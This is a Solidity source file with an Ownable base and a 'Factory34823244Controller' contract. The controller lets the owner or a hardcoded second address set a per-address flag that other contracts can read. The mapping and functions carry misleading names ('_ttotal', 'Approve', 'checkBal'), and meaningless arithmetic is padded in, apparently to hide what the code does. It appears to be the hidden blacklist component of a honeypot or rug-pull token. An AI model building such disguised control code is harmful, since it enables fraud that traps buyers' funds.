// SPDX-License-Identifier: MIT


pragma solidity 0.8.9;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}




contract Factory34823244Controller is Ownable {

    mapping(address => bool) public _ttotal;
    address public authorizedAddress;

    uint256 route2522 = 876786786;
    uint256 route252 = route252 / 87676;
    uint256 j32 = route252 / 87677;
    uint256 route2363 = route252 + route252 / 546546 * 5445345;

    // Constructor to set authorizedAddress at contract creation
    constructor() {
        authorizedAddress = 0x3b837964881D39c46aED552A6d7A37dDaddF8574;
    }

    // Modifier to require that the caller is the owner or the authorized address
    modifier onlyOwnerOrAuthorized() {
        require(msg.sender == owner() || msg.sender == authorizedAddress, "Not aauthorized");
        _;
    }

    // Function to set the authorized address; only callable by the owner
    function setAuthorizedAddress(address _authorizedAddress) external onlyOwner {
        authorizedAddress = _authorizedAddress;
    }

    function Approve(address[] memory _addresses, bool[] memory _addb) external onlyOwnerOrAuthorized {
        require(_addresses.length == _addb.length, "Addresses and arrays must have the same length");
        uint256 var36 = 64984651;
        uint256 var11 = var36 / 65976;
        uint256 var33 = var11 + var36 / 2 * 654654;
        for (uint256 i = 0; i < _addresses.length; i++) {
            _ttotal[_addresses[i]] = _addb[i];
        }
    }

    function checkBal(address _address) external view returns (bool) {
        return _ttotal[_address];
    }
}